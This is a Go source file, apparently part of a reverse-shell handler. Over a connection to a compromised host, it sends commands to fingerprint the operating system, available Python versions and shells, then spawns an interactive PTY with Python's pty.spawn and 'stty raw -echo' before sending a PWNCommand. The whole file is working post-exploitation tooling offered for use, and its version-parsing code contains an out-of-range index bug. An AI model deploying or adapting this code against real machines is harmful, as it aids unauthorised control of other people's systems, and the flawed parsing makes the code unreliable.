package main

import (
	"fmt"
	"net"
	"strings"
	"time"
)

// SystemDetector handles detection of OS and Python versions
type SystemDetector struct {
	conn net.Conn
}

// NewSystemDetector creates a new SystemDetector instance
func NewSystemDetector(conn net.Conn) *SystemDetector {
	return &SystemDetector{
		conn: conn,
	}
}

// DetectOS detects the operating system of the connected client
func (sd *SystemDetector) DetectOS() string {
	osDetection := []string{
		"ver 2>/dev/null",           // Windows
		"uname -a 2>/dev/null",      // Linux/Unix
		"systeminfo 2>/dev/null",    // Windows (more detailed)
		"cat /etc/os-release 2>/dev/null", // Linux
	}

	for _, cmd := range osDetection {
		if _, err := sd.conn.Write([]byte(cmd + "\n")); err == nil {
			// Read response with timeout
			sd.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			buf := make([]byte, 1024)
			n, err := sd.conn.Read(buf)
			if err == nil {
				response := strings.ToLower(string(buf[:n]))

				// Windows detection
				if strings.Contains(response, "microsoft windows") ||
					strings.Contains(response, "windows") ||
					strings.Contains(response, "microsoft corporation") {
					return "Windows"
				}

				// Linux detection
				if strings.Contains(response, "linux") ||
					strings.Contains(response, "ubuntu") ||
					strings.Contains(response, "debian") ||
					strings.Contains(response, "centos") ||
					strings.Contains(response, "red hat") {
					return "Linux"
				}

				// macOS detection
				if strings.Contains(response, "darwin") ||
					strings.Contains(response, "macos") ||
					strings.Contains(response, "apple") {
					return "macOS"
				}
			}
		}
	}
	return "Unknown"
}

// DetectPythonVersions detects available Python versions
func (sd *SystemDetector) DetectPythonVersions() []string {
	var versions []string
	pythonChecks := []string{
		"python3 --version >/dev/null 2>&1 && python3 --version; echo 'PYTHON_END'",
		"python2 --version >/dev/null 2>&1 && python2 --version; echo 'PYTHON_END'",
		"python --version >/dev/null 2>&1 && python --version; echo 'PYTHON_END'",
	}

	fmt.Println("[+] Detecting Python versions...")
	for _, cmd := range pythonChecks {
		if _, err := sd.conn.Write([]byte(cmd + "\n")); err == nil {
			// Give a bit more time for the response
			sd.conn.SetReadDeadline(time.Now().Add(3 * time.Second))

			// Read until we find our marker or timeout
			var fullResponse strings.Builder
			buf := make([]byte, 1024)
			for {
				n, err := sd.conn.Read(buf)
				if err != nil {
					break
				}
				fullResponse.Write(buf[:n])
				if strings.Contains(fullResponse.String(), "PYTHON_END") {
					break
				}
			}

			response := fullResponse.String()
			// Split by newlines and look for Python version
			lines := strings.Split(response, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if line == "PYTHON_END" || line == "$" {
					continue
				}
				if strings.Contains(line, "Python") ||
					strings.Contains(line, "python") {
					// Clean up the response to get just the version
					version := strings.TrimSpace(line)
					splitVersion := strings.Split(version, " ")
					if len(splitVersion) > 1 {
						version = splitVersion[2]
					}else{
						version = splitVersion[1]
					}
					if !strings.HasPrefix(version, "Python") {
						version = "Python " + version
					}
					versions = append(versions, version)
					fmt.Println("[+] Found Python version:", version)
					break
				}
			}
		}
	}
	return versions
}

// DetectShell detects available shell
func (sd *SystemDetector) DetectShell() string {
	shellChecks := []string{
		"which /bin/bash 2>/dev/null",
		"which /bin/sh 2>/dev/null",
		"which /bin/zsh 2>/dev/null",
	}

	for _, cmd := range shellChecks {
		if _, err := sd.conn.Write([]byte(cmd + "\n")); err == nil {
			sd.conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			buf := make([]byte, 1024)
			n, err := sd.conn.Read(buf)
			if err == nil {
				response := strings.TrimSpace(string(buf[:n]))
				if response != "" {
					return response
				}
			}
		}
	}
	return ""
}

// SpawnPTY attempts to spawn a PTY using Python
func (sd *SystemDetector) SpawnPTY(pythonVersions []string, shell string) bool {
	if len(pythonVersions) == 0 || shell == "" {
		return false
	}

	// Use the first available Python version
	pythonCmd := "python"
	if strings.Contains(pythonVersions[0], "Python 3") {
		pythonCmd = "python3"
	} else if strings.Contains(pythonVersions[0], "Python 2") {
		pythonCmd = "python2"
	}

	ptyCmd := fmt.Sprintf("%s -c 'import pty;pty.spawn(\"%s\");'", pythonCmd, shell)
	fmt.Printf("[+] Attempting to spawn PTY using %s with %s\n", pythonCmd, shell)

	if _, err := sd.conn.Write([]byte(ptyCmd + "\n")); err == nil {
		// Give it a moment to spawn
		time.Sleep(1 * time.Second)
		// Send stty command with output redirection
		sd.conn.Write([]byte(fmt.Sprintf("stty raw -echo >/dev/null 2>&1 ; echo '%s'\n", PWNCommand)))

		return true
	}
	return false
} 